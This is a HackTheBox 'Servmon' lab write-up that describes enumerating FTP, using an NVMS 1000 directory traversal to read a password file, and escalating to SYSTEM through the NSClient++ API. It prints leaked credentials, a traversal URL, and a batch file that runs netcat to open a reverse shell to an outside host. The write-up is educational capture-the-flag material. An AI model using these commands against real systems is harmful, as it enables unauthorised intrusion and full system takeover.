@@ -1,0 +1,151 @@
+---
+title: HackTheBox - Servmon Write-up
+description: HackTheBox - Servmon Write-up by thewhiteh4t
+pubDate: 2020-07-08
+categName: hack-the-box
+tagList: htb,writeup,windows
+author: thewhiteh4t
+cardImage: ../../assets/post_imgs/htb-servmon-writeup/cardImage.jpg
+---
+## Information Gathering
+
+Port and service enumeration using nmap
+
+```bash
+nmap -F -T 5 10.10.10.184 -Pn
+
+Nmap scan report for 10.10.10.184
+Host is up (0.19s latency).
+Not shown: 92 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+5666/tcp open  nrpe
+8443/tcp open  https-al
+```
+
+## Enumeration
+
+FTP port is open so lets try anonymous login here...
+
+```
+username : anonymous
+password : anonymous
+```
+
+```bash
+$ ftp 10.10.10.184
+
+Connected to 10.10.10.184.
+220 Microsoft FTP Service
+Name (10.10.10.184:unknown): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT
+```
+
+Anonymous Login was successful, after some enumeration I found some interesting files and two usernames, downloaded using get command in ftp shell...
+
+```bash
+get Users/Nadine/Confidential.txt
+get Users/Nathan/Notes to do.txt
+---
+$ cat Confidential.txt
+Nathan,
+
+I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
+
+Regards
+
+Nadine
+
+$ cat 'Notes to do.txt'
+1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint
+```
+
+On port 80 NVMS 1000 web application was running, a quick google search led to a directory traversal vulnerability so I tried to get this Passwords.txt file...
+
+```
+http://10.10.10.184/../../../Users/Nathan/Desktop/Passwords.txt
+
+--------------------------------
+| Username : Nadine            |
+| Password : L1k3B1gBut7s@W0rk |
+--------------------------------
+```
+
+SSH service was also active as we can see in the nmap scan so next step was to login using these credentials...
+
+```bash
+$ scp Nadine@10.10.10.184:Desktop/user.txt user.txt
+
+# Got User!
+```
+
+## Privilege Escalation
+
+In Confidential.txt NSClient is mentioned so it was time for some more digging...
+
+```shell
+> dir /s *nsclient*
+
+Directory of C:\Program Files\NSClient++
+
+10/04/2020  19:32             2,683 nsclient.ini
+21/04/2020  08:27            29,651 nsclient.log
+               2 File(s)         32,334 bytes
+```
+
+For reading files there were two easy ways here...
+
+```shell
+type nsclient.ini
+
+# OR
+
+nscp web -- password --display
+
+---------------------------
+; Undocumented key
+password = ew2x6SsGTxjRwXOT
+
+; Undocumented key
+allowed hosts = 127.0.0.1
+----------------------------
+```
+
+Only localhost is allowed...solution is to use an SSH tunnel and then we can visit the webpage
+
+```bash
+ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184
+```
+
+After some poking around in the web page and some NSClient++ manual reading the best way to exploit this was to use the API, first I created a small .bat file and uploaded it to temp directory, after that privesc needs just two commands...
+
+```bash
+$ cat twh.bat
+@echo off
+c:\temp\nc.exe 10.10.14.54 443 -e cmd.exe
+
+$ scp twh.bat Nadine@10.10.10.184:c:/temp/twh.bat
+$ scp nc.exe Nadine@10.10.10.184:c:/temp/nc.exe
+```
+
+and now finally...
+
+```bash
+$ curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/twh.bat --data-binary @twh.bat
+
+> C:\Program Files\NSClient++>check_nrpe.exe -c twh
+
+# Got Root!
+```
